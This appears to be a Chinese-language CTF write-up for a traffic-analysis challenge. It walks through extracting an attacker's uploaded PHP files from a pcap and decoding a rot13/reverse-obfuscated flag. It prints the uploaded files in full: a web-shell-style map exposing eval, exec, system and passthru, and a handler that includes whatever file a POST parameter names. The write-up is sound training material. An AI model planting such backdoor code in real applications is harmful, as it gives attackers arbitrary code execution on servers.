---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# 星期四的狂想

<Container type='info'>

本题考查 HTTP 流量分析及简单的编码解码能力。
</Container>

我们使用 [wireshark](https://www.wireshark.org/#download) 工具可以分析 pcag 文件。

打开之后会看到密密麻麻的通讯协议流量，我们可以点击“文件” → “导出对象” → “HTTP” 来分析所有使用 HTTP 通讯的流量。

![alt text](/assets/images/wp/2025/week2/thursday_1.png)

通过分析 `upload.php` 的所有流量，我们能获取到这样几个信息：

1. 攻击者上传了一个 `chickenvivo50.php` 文件，用于提供函数；
2. 攻击者上传了一个 `crazy.php` 文件，用于读取与混淆 flag；
3. 然后从 `uploads/index.php` 处触发攻击。

`chickenvivo50.php`：

```php
<?php
$func_map = [
  "print" => function($code) { eval($code); },
  "thursday" => "exec",
  'chicken' => 'system',
  'vivo' => 'header',
  'vv50' => 'passthru',
  "crazy" => function($file) { require_once($file); }
];

$getFunction = function($name) use ($func_map) {
  return isset($func_map[$name]) ? $func_map[$name] : null;
};
?>
```

`crazy.php`：

```php
<?php
echo "Hello, world!";

$flag = base64_encode(file_get_contents("/flag"));
$hahahahahaha = '';
foreach (str_split($flag, 10) as $part) {
  if (rand(0, 1)) {
    $part = strrev($part);
  } else {
    $part = str_rot13($part);
  }
  $hahahahahaha .= $part;
}

$GLOBALS['ThURSDAY'] = $hahahahahaha;
function code($x) {
  return "Cookie: token=" . base64_encode($x);
}
?>
```

`index.php`：

```php
<?php
include "chickenvivo50.php";

$getFunction('chicken')('echo ***\n');

$getFunction('crazy')($_POST["file"]);

$getFunction("vivo")(code($GLOBALS[$_GET['cmd']]));

?>
```

很明显，如果我们设定 `cmd=ThURSDAY` 就会执行 `code($hahahahahaha)`，然后从 `Cookie` 处返回回来一个 `token` 参量。

这里的 `$hahahahahaha` 是 flag 通过编码后的形式。通过逆向 `crazy.php` 中的内容，我们可以知道，flag 被读取之后会被 base64 编码，然后被切成十个十个一组，通过随机的方式进行 rot13 或者 reverse 编码。

理解了加密逻辑之后，我们就可以编写一个解密脚本，由于块并不是很多，所以我们可以直接暴力枚举每一个块的可能性，如果在块比较多的情况下，我们可以考虑逐块尝试。

下面是我们的加密数据。

![alt text](/assets/images/wp/2025/week2/thursday_2.png)

`decoder.py`：

```python
# decoder.py

import base64, codecs

enc = "R2FYdDNaaHhtWlMwS21TR0szRVZxSUF4QVV5c0hLVzlWZXN0MllwVmdDOUJUTlBaVlM9PQ=="

dec = base64.b64decode(enc.encode()).decode()
print(f"第一层解码：{dec}")

Split = lambda s, n: [s[i:i+n] for i in range(0, len(s), n)]

parts = Split(dec, 10)
final_dec = ""


for i in parts:
  part_dec1 = codecs.encode(i, 'rot_13')
  part_dec2 = i[::-1]
  try:
    now_enc = final_dec + part_dec1
    missing_padding = len(now_enc) % 4
    if missing_padding:
        now_enc += '=' * (4 - missing_padding)
    print(f"[*] 尝试解码方法：ROT13")
    res = base64.b64decode(now_enc.encode()).decode()
    print(f"[+] 成功解码：{res}")
    final_dec += part_dec1
  except Exception as e:
    now_enc = final_dec + part_dec2
    missing_padding = len(now_enc) % 4
    if missing_padding:
        now_enc += '=' * (4 - missing_padding)
    print(f"[*] 尝试解码方法：反转")
    res = base64.b64decode(now_enc.encode()).decode()
    print(f"[+] 成功解码：{res}")
    final_dec += part_dec2

print(f"最终解码结果：{base64.b64decode(final_dec.encode()).decode()}")
```

最终 flag 为 `flag{What_1S_tHuSd4y_Quickly_VIVO50}`。
